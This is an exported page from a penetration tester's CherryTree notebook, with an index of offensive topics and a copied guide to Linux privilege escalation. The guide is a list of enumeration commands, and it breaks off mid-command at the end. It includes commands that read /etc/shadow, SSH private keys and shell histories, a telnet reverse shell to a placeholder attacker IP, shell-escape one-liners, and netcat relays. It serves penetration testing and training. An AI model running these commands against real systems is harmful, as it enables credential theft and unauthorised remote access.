<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>privilege-escalation-linux</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="trash.html">trash</a></p>

<p><a href="lockpicking.html">lockpicking</a></p>

<ol>
<li><a href="lockpicking--blackbox_picking.html">blackbox picking</a></li>
</ol>
<p><a href="new_folder_2.html">new folder 2</a></p>

<p><a href="Commands.html">Commands</a></p>

<ol>
<li><a href="Commands--arp-spoof.html">arp-spoof</a></li>
<li><a href="Commands--wp-scan.html">wp-scan</a></li>
<li><a href="Commands--put-http.html">put-http</a></li>
<li><a href="Commands--crackmapexec.html">crackmapexec</a></li>
<li><a href="Commands--redis.html">redis</a></li>
<li><a href="Commands--sshuttle.html">sshuttle</a></li>
<li><a href="Commands--c~.html">c#</a></li>
<li><a href="Commands--nikto-proxy.html">nikto-proxy</a></li>
<li><a href="Commands--gather-gpp-creds.html">gather-gpp-creds</a></li>
<li><a href="Commands--webdav.html">webdav</a></li>
<li><a href="Commands--trash.html">trash</a></li>
<li><a href="Commands--nessus-openvas.html">nessus-openvas</a></li>
<li><a href="Commands--mimikatz.html">mimikatz</a></li>
<ol>
<li><a href="Commands--mimikatz--mimikatz_-_remote_control,_rpc.html">mimikatz - remote control, rpc</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_list_commands_in_module.html">mimikatz - list commands in module</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_start_and_stop_processes.html">mimikatz - start and stop processes</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_applocker_bypass_and_other_sn.html">mimikatz - applocker bypass and other sn</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_rdp.html">mimikatz - rdp</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_avoid_new_events.html">mimikatz - avoid new events</a></li>
<li><a href="Commands--mimikatz--mimikatz_list_modules.html">mimikatz list modules</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_tokens.html">mimikatz - tokens</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_base64_all_the_things.html">mimikatz - base64 all the things</a></li>
</ol>
<li><a href="Commands--masscan.html">masscan</a></li>
<li><a href="Commands--nmap_and_scanning.html">nmap and scanning</a></li>
<li><a href="Commands--shellshock-squid.html">shellshock-squid</a></li>
<li><a href="Commands--virtual-box_guest_additions.html">virtual-box guest additions</a></li>
<li><a href="Commands--rbash.html">rbash</a></li>
<li><a href="Commands--ping_sweep.html">ping sweep</a></li>
<li><a href="Commands--cut_commands.html">cut commands</a></li>
<li><a href="Commands--mount-shares.html">mount-shares</a></li>
<li><a href="Commands--lateral_movement.html">lateral movement</a></li>
<li><a href="Commands--xss-iframe.html">xss-iframe</a></li>
<li><a href="Commands--dns-zone-transfer.html">dns-zone-transfer</a></li>
<li><a href="Commands--nginx-bypass.html">nginx-bypass</a></li>
<li><a href="Commands--spawn_a_better_shell_-_break_out_of_shit.html">spawn_a_better_shell - break out of shit</a></li>
<li><a href="Commands--port-forward.html">port-forward</a></li>
<li><a href="Commands--physical_hacking.html">physical hacking</a></li>
<ol>
<li><a href="Commands--physical_hacking--rasperry_pi.html">rasperry pi</a></li>
<li><a href="Commands--physical_hacking--bash_bunny.html">bash bunny</a></li>
</ol>
<li><a href="Commands--searchsploit.html">searchsploit</a></li>
<li><a href="Commands--custom-payloads.html">custom-payloads</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land.html">bypass applocker - live off land</a></li>
<ol>
<li><a href="Commands--bypass_applocker_-_live_off_land--msbuild.html">msbuild</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--installutil.html">installutil</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--demiguise.html">demiguise</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--mshta.html">mshta</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--regsvcs.html">regsvcs</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--pubprn.vbs.html">pubprn.vbs</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--regasm_2.html">regasm 2</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--vbs_macro.html">vbs macro</a></li>
</ol>
<li><a href="Commands--pass_the_hash.html">pass the hash</a></li>
<li><a href="Commands--snmp.html">snmp</a></li>
<li><a href="Commands--client-side-iframe-attack.html">client-side-iframe-attack</a></li>
<li><a href="Commands--mortar-shells.html">mortar-shells</a></li>
<li><a href="Commands--bypass-uac.html">bypass-uac</a></li>
<li><a href="Commands--privilege-escalation-linux.html">privilege-escalation-linux</a></li>
<li><a href="Commands--rdesktop_and_screen_for_linux.html">rdesktop and screen for linux</a></li>
<li><a href="Commands--password-cracking.html">password-cracking</a></li>
<li><a href="Commands--cobalt_strike_2.html">cobalt strike 2</a></li>
<ol>
<li><a href="Commands--cobalt_strike_2--cobalt_strike_certificates.html">cobalt strike certificates</a></li>
<li><a href="Commands--cobalt_strike_2--malleable.html">malleable</a></li>
<li><a href="Commands--cobalt_strike_2--cpl_resource_runner_payload.html">cpl resource runner payload</a></li>
<li><a href="Commands--cobalt_strike_2--situational_awareness_-_harmj0y.html">situational awareness - harmj0y</a></li>
<li><a href="Commands--cobalt_strike_2--go_daddy_domain.html">go daddy domain</a></li>
<li><a href="Commands--cobalt_strike_2--safety.html">safety</a></li>
<li><a href="Commands--cobalt_strike_2--random_commands.html">random commands</a></li>
<li><a href="Commands--cobalt_strike_2--playbook.html">playbook</a></li>
<ol>
<li><a href="Commands--cobalt_strike_2--playbook--privilege_escalation.html">privilege escalation</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--lateral_movement.html">lateral movement</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--overpass_the_hash_with_rubeus-beacon_-_h.html">overpass the hash with rubeus-beacon - h</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--after_initial_access.html">after initial access</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--persistence.html">persistence</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--mail_and_smtp_enumeration-manipulation.html">mail and smtp enumeration-manipulation</a></li>
</ol>
<li><a href="Commands--cobalt_strike_2--generating_certificates.html">generating certificates</a></li>
<li><a href="Commands--cobalt_strike_2--github_repos.html">github repos</a></li>
<li><a href="Commands--cobalt_strike_2--golden_ticket.html">golden ticket</a></li>
<li><a href="Commands--cobalt_strike_2--apache_rewrite_.htaccess.html">apache rewrite .htaccess</a></li>
<li><a href="Commands--cobalt_strike_2--malware_av_evasion.html">malware av evasion</a></li>
<ol>
<li><a href="Commands--cobalt_strike_2--malware_av_evasion--main.go.html">main.go</a></li>
</ol>
<li><a href="Commands--cobalt_strike_2--c2_infrastructure.html">c2 infrastructure</a></li>
<li><a href="Commands--cobalt_strike_2--sid_hopping.html">sid hopping</a></li>
</ol>
<li><a href="Commands--random_shellcode_-_scratch-pad.html">random shellcode - scratch-pad</a></li>
<li><a href="Commands--powerview.html">powerview</a></li>
<ol>
<li><a href="Commands--powerview--new_page.html">new page</a></li>
</ol>
<li><a href="Commands--windows.html">windows</a></li>
<ol>
<li><a href="Commands--windows--windows_-_powerview_3.0,_harmj0y.html">windows - powerview 3.0, harmj0y</a></li>
<li><a href="Commands--windows--windows_passwords.html">windows passwords</a></li>
<li><a href="Commands--windows--windows_-_search_4_loot.html">windows - search 4 loot</a></li>
<li><a href="Commands--windows--windows_-_laps_abuse.html">windows - laps abuse</a></li>
<li><a href="Commands--windows--windows_-_powershell_web_access.html">windows - powershell web access</a></li>
<li><a href="Commands--windows--windows_-_port_forward.html">windows - port forward</a></li>
<li><a href="Commands--windows--windows_privesc.html">windows privesc</a></li>
<li><a href="Commands--windows--windows_enumeration.html">windows enumeration</a></li>
<li><a href="Commands--windows--windows_-_uninstall_patches.html">windows - uninstall patches</a></li>
<li><a href="Commands--windows--windows_-_powerview,_enumerate_groups-ac.html">windows - powerview, enumerate groups-ac</a></li>
<li><a href="Commands--windows--windows_-_powerview_acl_enum-abuse.html">windows - powerview acl enum-abuse</a></li>
<li><a href="Commands--windows--windows_service_abuse.html">windows service abuse</a></li>
<li><a href="Commands--windows--windows_firewall.html">windows firewall</a></li>
<li><a href="Commands--windows--windows_-_powershell_-_quickies.html">windows - powershell - quickies</a></li>
</ol>
<li><a href="Commands--outlook_and_owa.html">outlook and owa</a></li>
<li><a href="Commands--tmux_2.html">tmux 2</a></li>
<ol>
<li><a href="Commands--tmux_2--tmux_config.html">tmux config</a></li>
<li><a href="Commands--tmux_2--tmux_cheat_sheet.html">tmux cheat sheet</a></li>
</ol>
<li><a href="Commands--reverse_shell_one_liners.html">reverse shell one liners</a></li>
<ol>
<li><a href="Commands--reverse_shell_one_liners--java_reverse_shell.html">java reverse shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--python_reverse_shell.html">python reverse shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--php-reverse-shell.html">php-reverse-shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--perl-reverse-shell-cgi-format.html">perl-reverse-shell-cgi-format</a></li>
<li><a href="Commands--reverse_shell_one_liners--c-language-reverse-shell.html">c-language-reverse-shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--ruby.html">ruby</a></li>
</ol>
<li><a href="Commands--tar.html">tar</a></li>
<li><a href="Commands--ssh.html">ssh</a></li>
<li><a href="Commands--named_pipes.html">named pipes</a></li>
<li><a href="Commands--enumeration.html">enumeration</a></li>
<li><a href="Commands--python.html">python</a></li>
<li><a href="Commands--nac_testing.html">nac testing</a></li>
<li><a href="Commands--red_team.html">red team</a></li>
<ol>
<li><a href="Commands--red_team--privilege_escalation.html">privilege escalation</a></li>
<li><a href="Commands--red_team--lateral_movement.html">lateral movement</a></li>
<li><a href="Commands--red_team--privilege_escalation_across_trusts.html">privilege escalation across trusts</a></li>
<li><a href="Commands--red_team--active_directory_one_liners.html">active directory one liners</a></li>
<li><a href="Commands--red_team--enumeration.html">enumeration</a></li>
<li><a href="Commands--red_team--persistence_techniques.html">persistence techniques</a></li>
<li><a href="Commands--red_team--abusing_sql_server_trusts.html">abusing sql server trusts</a></li>
<ol>
<li><a href="Commands--red_team--abusing_sql_server_trusts--privilege_escalation.html">privilege escalation</a></li>
<li><a href="Commands--red_team--abusing_sql_server_trusts--post_exploitation_enumeration.html">post exploitation enumeration</a></li>
</ol>
<li><a href="Commands--red_team--domain_privilege_escalation.html">domain privilege escalation</a></li>
<li><a href="Commands--red_team--file_servers_and_files.html">file servers and files</a></li>
<li><a href="Commands--red_team--bloodhound.html">bloodhound</a></li>
<li><a href="Commands--red_team--forest_enumeration.html">forest enumeration</a></li>
</ol>
<li><a href="Commands--smb-netbios-rpc.html">smb-netbios-rpc</a></li>
<li><a href="Commands--laps.html">laps</a></li>
<li><a href="Commands--password-grep.html">password-grep</a></li>
<li><a href="Commands--xml-xxe-xpath.html">xml-xxe-xpath</a></li>
<li><a href="Commands--ports.html">ports</a></li>
<li><a href="Commands--de-duplicate.html">de-duplicate</a></li>
<li><a href="Commands--mac_address_change.html">mac address change</a></li>
<li><a href="Commands--test-for-xxe.html">test-for-xxe</a></li>
<li><a href="Commands--droopescan.html">droopescan</a></li>
<li><a href="Commands--dnscat.html">dnscat</a></li>
<li><a href="Commands--fresh-install.html">fresh-install</a></li>
<li><a href="Commands--httpscreenshot.html">httpscreenshot</a></li>
<li><a href="Commands--buffer-overflow.html">buffer-overflow</a></li>
<li><a href="Commands--osint.html">osint</a></li>
<li><a href="Commands--spooler_exploit.html">spooler exploit</a></li>
<li><a href="Commands--wifi-hacking.html">wifi-hacking</a></li>
<ol>
<li><a href="Commands--wifi-hacking--aircrack-ng_and_jtr_attack.html">aircrack-ng and jtr attack</a></li>
<li><a href="Commands--wifi-hacking--crack_wep.html">crack wep</a></li>
<li><a href="Commands--wifi-hacking--aircrack-ng.html">aircrack-ng</a></li>
<li><a href="Commands--wifi-hacking--fluxion.html">fluxion</a></li>
<li><a href="Commands--wifi-hacking--reaver.html">reaver</a></li>
<li><a href="Commands--wifi-hacking--wep_shared_key_authentication_attack.html">wep shared key authentication attack</a></li>
<li><a href="Commands--wifi-hacking--cowpatty_attack.html">cowpatty attack</a></li>
<li><a href="Commands--wifi-hacking--new_page.html">new page</a></li>
<li><a href="Commands--wifi-hacking--hostapd.html">hostapd</a></li>
<li><a href="Commands--wifi-hacking--rogue_access_point.html">rogue access point</a></li>
<li><a href="Commands--wifi-hacking--cracking_wpa_attack.html">cracking wpa attack</a></li>
<li><a href="Commands--wifi-hacking--wifite.html">wifite</a></li>
<li><a href="Commands--wifi-hacking--eaphammer.html">eaphammer</a></li>
<li><a href="Commands--wifi-hacking--handshake-via-pcap.html">handshake-via-pcap</a></li>
<li><a href="Commands--wifi-hacking--cracking_wep_via_a_client_attack.html">cracking wep via a client attack</a></li>
<li><a href="Commands--wifi-hacking--basics.html">basics</a></li>
<li><a href="Commands--wifi-hacking--pyrit_attack.html">pyrit attack</a></li>
<li><a href="Commands--wifi-hacking--clientless_wep_attack.html">clientless wep attack</a></li>
</ol>
<li><a href="Commands--images-with-files-in-them.html">images-with-files-in-them</a></li>
<li><a href="Commands--xxd.html">xxd</a></li>
<li><a href="Commands--proxychains.html">proxychains</a></li>
<li><a href="Commands--tools-sources.html">tools-sources</a></li>
<li><a href="Commands--lolbins.html">lolbins</a></li>
<li><a href="Commands--goddi_-_domain_enumeration.html">goddi - domain enumeration</a></li>
<li><a href="Commands--sed_and_changing_files_for_malware_evasi.html">sed and changing files for malware evasi</a></li>
<li><a href="Commands--mail_sniper.html">mail sniper</a></li>
<li><a href="Commands--postgresql.html">postgresql</a></li>
<li><a href="Commands--files-inside-of-pictures.html">files-inside-of-pictures</a></li>
<li><a href="Commands--unicorn_scan.html">unicorn scan</a></li>
<li><a href="Commands--metasploit-meterpreter.html">metasploit-meterpreter</a></li>
<ol>
<li><a href="Commands--metasploit-meterpreter--metasploit_-_reverse_shells.html">metasploit - reverse_shells</a></li>
<li><a href="Commands--metasploit-meterpreter--metasploit-nessus.html">metasploit-nessus</a></li>
<li><a href="Commands--metasploit-meterpreter--meterpreter.html">meterpreter</a></li>
<li><a href="Commands--metasploit-meterpreter--network.html">network</a></li>
</ol>
<li><a href="Commands--compiling-code.html">compiling-code</a></li>
<li><a href="Commands--remote_and_local_file_inclusion.html">remote and local file inclusion</a></li>
<li><a href="Commands--proxychains-admin-network.html">proxychains-admin-network</a></li>
<li><a href="Commands--linux.html">linux</a></li>
<li><a href="Commands--privilege-escalation-windows_-_and_empir.html">privilege-escalation-windows - and empir</a></li>
<li><a href="Commands--powershell.html">powershell</a></li>
<ol>
<li><a href="Commands--powershell--constrained_language_breakout.html">constrained language breakout</a></li>
<li><a href="Commands--powershell--powerup_-_privilege_escalation.html">powerup - privilege escalation</a></li>
<li><a href="Commands--powershell--user_enumeration.html">user enumeration</a></li>
<li><a href="Commands--powershell--powershell_-_get-system.html">powershell - get-system</a></li>
<li><a href="Commands--powershell--powershell_sans_cheat.html">powershell sans cheat</a></li>
<li><a href="Commands--powershell--find_files_by_name.html">find files by name</a></li>
<li><a href="Commands--powershell--random_powershell.html">random powershell</a></li>
<li><a href="Commands--powershell--domain_enumeration.html">domain enumeration</a></li>
<li><a href="Commands--powershell--enable_psremoting.html">enable psremoting</a></li>
</ol>
<li><a href="Commands--sql.html">sql</a></li>
<li><a href="Commands--waf.html">waf</a></li>
<li><a href="Commands--network-change-ip.html">network-change-ip</a></li>
<li><a href="Commands--merlin.html">merlin</a></li>
<li><a href="Commands--web_discovery.html">web discovery</a></li>
<li><a href="Commands--exploit-pack.html">exploit-pack</a></li>
<li><a href="Commands--get-browserdata.html">get-browserdata</a></li>
<li><a href="Commands--user_agent.html">user agent</a></li>
<li><a href="Commands--group-policy-decrypt-passwords.html">group-policy-decrypt-passwords</a></li>
<li><a href="Commands--root_user_add.html">root_user_add</a></li>
<li><a href="Commands--hex_encode_command_line.html">hex encode command line</a></li>
<li><a href="Commands--block-ip-iptables.html">block-ip-iptables</a></li>
<li><a href="Commands--host_discovery-dns.html">host_discovery-dns</a></li>
<li><a href="Commands--certificate_tls_and_ssl.html">certificate tls and ssl</a></li>
<li><a href="Commands--wget.html">wget</a></li>
<li><a href="Commands--php-shells.html">php-shells</a></li>
<li><a href="Commands--payloads.html">payloads</a></li>
<li><a href="Commands--ad-notes.html">ad-notes</a></li>
<ol>
<li><a href="Commands--ad-notes--laps_abuse.html">laps abuse</a></li>
<li><a href="Commands--ad-notes--more-ad-notes.html">more-ad-notes</a></li>
<li><a href="Commands--ad-notes--ad-notes-chirag.html">ad-notes-chirag</a></li>
<li><a href="Commands--ad-notes--pam_abuse.html">pam abuse</a></li>
</ol>
<li><a href="Commands--have_a_shell.html">have_a_shell</a></li>
<li><a href="Commands--curl-wget.html">curl-wget</a></li>
<li><a href="Commands--shell-for-buffer-overflow.html">shell-for-buffer-overflow</a></li>
<li><a href="Commands--__NOTEBOOK__.html">__NOTEBOOK__</a></li>
<ol>
<li><a href="Commands--__NOTEBOOK__--icons.html">icons</a></li>
<li><a href="Commands--__NOTEBOOK__--lost_found.html">lost_found</a></li>
<li><a href="Commands--__NOTEBOOK__--orphans.html">orphans</a></li>
</ol>
<li><a href="Commands--netcat-ftp.html">netcat-ftp</a></li>
<li><a href="Commands--responder.html">responder</a></li>
<li><a href="Commands--assembly.html">assembly</a></li>
</ol>
<p><a href="mobile.html">mobile</a></p>

<ol>
<li><a href="mobile--smali_and_baksmali.html">smali and baksmali</a></li>
<li><a href="mobile--dex2jar.html">dex2jar</a></li>
<li><a href="mobile--apktool.html">apktool</a></li>
<li><a href="mobile--baby_steps.html">baby steps</a></li>
<li><a href="mobile--jd-gui.html">jd-gui</a></li>
<li><a href="mobile--qark.html">qark</a></li>
</ol>
<p><a href="mainframe.html">mainframe</a></p>

<ol>
<li><a href="mainframe--nmap_stuff_-_recon.html">nmap stuff - recon</a></li>
<li><a href="mainframe--tso_commands.html">tso commands</a></li>
</ol>
<p><a href="links_and_random.html">links and random</a></p>

<ol>
<li><a href="links_and_random--mimikatz.html">mimikatz</a></li>
<li><a href="links_and_random--wifi_driver_stuff.html">wifi driver stuff</a></li>
<li><a href="links_and_random--bypassing_applocker_living_off_land.html">bypassing applocker living off land</a></li>
<li><a href="links_and_random--ptx.html">ptx</a></li>
</ol></div>
<div class="page"><h1><b><u>privilege-escalation-linux</u></b></h1>RSS<br />Search<br />BlogArchivesScriptsVideos<br />Basic Linux Privilege Escalation<br />Before starting, I would like to point out - I'm no expert. As far as I know, there isn't a "magic" answer, in this huge area. This is simply my finding, typed up, to be shared (my starting point). Below is a mixture of commands to do the same thing, to look at things in a different place or just a different light. I know there more "things" to look for. It's just a basic &amp; rough guide. Not every command will work for each system as Linux varies so much. "It" will not jump off the screen - you've to hunt for that "little thing" as "the devil is in the detail".<br /><br />Enumeration is the key.<br /><br />(Linux) privilege escalation is all about:<br /><br />Collect - Enumeration, more enumeration and some more enumeration.<br />Process - Sort through data, analyse and prioritisation.<br />Search - Know what to search for and where to find the exploit code.<br />Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".<br />Try - Get ready for (lots of) trial and error.<br />Operating System<br /><br />What's the distribution type? What version?<br /><br />cat /etc/issue<br />cat /etc/*-release<br />  cat /etc/lsb-release      # Debian based<br />  cat /etc/redhat-release   # Redhat based<br />What's the kernel version? Is it 64-bit?<br /><br />cat /proc/version<br />uname -a<br />uname -mrs<br />rpm -q kernel<br />dmesg | grep Linux<br />ls /boot | grep vmlinuz-<br />What can be learnt from the environmental variables?<br /><br />cat /etc/profile<br />cat /etc/bashrc<br />cat ~/.bash_profile<br />cat ~/.bashrc<br />cat ~/.bash_logout<br />env<br />set<br />Is there a printer?<br /><br />lpstat -a<br />Applications &amp; Services<br /><br />What services are running? Which service has which user privilege?<br /><br />ps aux<br />ps -ef<br />top<br />cat /etc/services<br />Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!<br /><br />ps aux | grep root<br />ps -ef | grep root<br />What applications are installed? What version are they? Are they currently running?<br /><br />ls -alh /usr/bin/<br />ls -alh /sbin/<br />dpkg -l<br />rpm -qa<br />ls -alh /var/cache/apt/archivesO<br />ls -alh /var/cache/yum/<br />Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?<br /><br />cat /etc/syslog.conf<br />cat /etc/chttp.conf<br />cat /etc/lighttpd.conf<br />cat /etc/cups/cupsd.conf<br />cat /etc/inetd.conf<br />cat /etc/apache2/apache2.conf<br />cat /etc/my.conf<br />cat /etc/httpd/conf/httpd.conf<br />cat /opt/lampp/etc/httpd.conf<br />ls -aRl /etc/ | awk '$1 ~ /^.*r.*/<br />What jobs are scheduled?<br /><br />crontab -l<br />ls -alh /var/spool/cron<br />ls -al /etc/ | grep cron<br />ls -al /etc/cron*<br />cat /etc/cron*<br />cat /etc/at.allow<br />cat /etc/at.deny<br />cat /etc/cron.allow<br />cat /etc/cron.deny<br />cat /etc/crontab<br />cat /etc/anacrontab<br />cat /var/spool/cron/crontabs/root<br />Any plain text usernames and/or passwords?<br /><br />grep -i user [filename]<br />grep -i pass [filename]<br />grep -C 5 "password" [filename]<br />find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla<br />Communications &amp; Networking<br /><br />What NIC(s) does the system have? Is it connected to another network?<br /><br />/sbin/ifconfig -a<br />cat /etc/network/interfaces<br />cat /etc/sysconfig/network<br />What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?<br /><br />cat /etc/resolv.conf<br />cat /etc/sysconfig/network<br />cat /etc/networks<br />iptables -L<br />hostname<br />dnsdomainname<br />What other users &amp; hosts are communicating with the system?<br /><br />lsof -i<br />lsof -i :80<br />grep 80 /etc/services<br />netstat -antup<br />netstat -antpx<br />netstat -tulpn<br />chkconfig --list<br />chkconfig --list | grep 3:on<br />last<br />w<br />Whats cached? IP and/or MAC addresses<br /><br />arp -e<br />route<br />/sbin/route -nee<br />Is packet sniffing possible? What can be seen? Listen to live traffic<br /><br />1<br />tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21<br />Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]<br /><br />Have you got a shell? Can you interact with the system?<br /><br />nc -lvp 4444    # Attacker. Input (Commands)<br />nc -lvp 4445    # Attacker. Ouput (Results)<br />telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!<br />Note: http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/<br /><br />Is port forwarding possible? Redirect and interact with traffic from another view<br /><br />Note: http://www.boutell.com/rinetd/<br /><br />Note: http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch<br /><br />Note: http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip<br /><br />Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]<br /><br /><br />FPipe.exe -l 80 -r 80 -s 80 192.168.1.7<br />Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]<br /><br />ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port<br />ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port<br />Note: mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe<br /><br />mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe    # Port Relay<br />mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe    # Proxy (Port 80 to 8080)<br />mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe    # Proxy monitor (Port 80 to 8080)<br />Is tunnelling possible? Send commands locally, remotely<br /><br />ssh -D 127.0.0.1:9050 -N [username]@[ip]<br />proxychains ifconfig<br />Confidential Information &amp; Users<br /><br />Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?<br /><br />id<br />who<br />w<br />last<br />cat /etc/passwd | cut -d: -f1    # List of users<br />grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users<br />awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users<br />cat /etc/sudoers<br />sudo -l<br />What sensitive files can be found?<br /><br />cat /etc/passwd<br />cat /etc/group<br />cat /etc/shadow<br />ls -alh /var/mail/<br />Anything "interesting" in the home directorie(s)? If it's possible to access<br /><br />ls -ahlR /root/<br />ls -ahlR /home/<br />Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords<br /><br />cat /var/apache2/config.inc<br />cat /var/lib/mysql/mysql/user.MYD<br />cat /root/anaconda-ks.cfg<br />What has the user being doing? Is there any password in plain text? What have they been edting?<br /><br />cat ~/.bash_history<br />cat ~/.nano_history<br />cat ~/.atftp_history<br />cat ~/.mysql_history<br />cat ~/.php_history<br />What user information can be found?<br /><br />cat ~/.bashrc<br />cat ~/.profile<br />cat /var/mail/root<br />cat /var/spool/mail/root<br />Can private-key information be found?<br /><br />cat ~/.ssh/authorized_keys<br />cat ~/.ssh/identity.pub<br />cat ~/.ssh/identity<br />cat ~/.ssh/id_rsa.pub<br />cat ~/.ssh/id_rsa<br />cat ~/.ssh/id_dsa.pub<br />cat ~/.ssh/id_dsa<br />cat /etc/ssh/ssh_config<br />cat /etc/ssh/sshd_config<br />cat /etc/ssh/ssh_host_dsa_key.pub<br />cat /etc/ssh/ssh_host_dsa_key<br />cat /etc/ssh/ssh_host_rsa_key.pub<br />cat /etc/ssh/ssh_host_rsa_key<br />cat /etc/ssh/ssh_host_key.pub<br />cat /etc/ssh/ssh_host_key<br />File Systems<br /><br />Which configuration files can be written in /etc/? Able to reconfigure a service?<br /><br />ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2&gt;/dev/null     # Anyone<br />ls -aRl /etc/ | awk '$1 ~ /^..w/' 2&gt;/dev/null       # Owner<br />ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2&gt;/dev/null    # Group<br />ls -aRl /etc/ | awk '$1 ~ /w.$/' 2&gt;/dev/null        # Other<br /><br />find /etc/ -readable -type f 2&gt;/dev/null               # Anyone<br />find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null   # Anyone<br />What can be found in /var/ ?<br /><br />ls -alh /var/log<br />ls -alh /var/mail<br />ls -alh /var/spool<br />ls -alh /var/spool/lpd<br />ls -alh /var/lib/pgsql<br />ls -alh /var/lib/mysql<br />cat /var/lib/dhcp3/dhclient.leases<br />Any settings/files (hidden) on website? Any settings file with database information?<br /><br /><br />ls -alhR /var/www/<br />ls -alhR /srv/www/htdocs/<br />ls -alhR /usr/local/www/apache22/data/<br />ls -alhR /opt/lampp/htdocs/<br />ls -alhR /var/www/html/<br />Is there anything in the log file(s) (Could help with "Local File Includes"!)<br /><br />cat /etc/httpd/logs/access_log<br />cat /etc/httpd/logs/access.log<br />cat /etc/httpd/logs/error_log<br />cat /etc/httpd/logs/error.log<br />cat /var/log/apache2/access_log<br />cat /var/log/apache2/access.log<br />cat /var/log/apache2/error_log<br />cat /var/log/apache2/error.log<br />cat /var/log/apache/access_log<br />cat /var/log/apache/access.log<br />cat /var/log/auth.log<br />cat /var/log/chttp.log<br />cat /var/log/cups/error_log<br />cat /var/log/dpkg.log<br />cat /var/log/faillog<br />cat /var/log/httpd/access_log<br />cat /var/log/httpd/access.log<br />cat /var/log/httpd/error_log<br />cat /var/log/httpd/error.log<br />cat /var/log/lastlog<br />cat /var/log/lighttpd/access.log<br />cat /var/log/lighttpd/error.log<br />cat /var/log/lighttpd/lighttpd.access.log<br />cat /var/log/lighttpd/lighttpd.error.log<br />cat /var/log/messages<br />cat /var/log/secure<br />cat /var/log/syslog<br />cat /var/log/wtmp<br />cat /var/log/xferlog<br />cat /var/log/yum.log<br />cat /var/run/utmp<br />cat /var/webmin/miniserv.log<br />cat /var/www/logs/access_log<br />cat /var/www/logs/access.log<br />ls -alh /var/lib/dhcp3/<br />ls -alh /var/log/postgresql/<br />ls -alh /var/log/proftpd/<br />ls -alh /var/log/samba/<br /><br />Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp<br />Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/<br /><br />If commands are limited, you break out of the "jail" shell?<br /><br />python -c 'import pty;pty.spawn("/bin/bash")'<br />echo os.system('/bin/bash')<br />/bin/sh -i<br />How are file-systems mounted?<br /><br />mount<br />df -h<br />Are there any unmounted file-systems?<br /><br />1<br />cat /etc/fstab<br />What "Advanced Linux File Permissions" are used? Sticky bits, SUID &amp; GUID<br /><br /><br />find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.<br />find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.<br />find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.<br /><br />find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID<br />for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)<br /><br /># find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)<br />find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} 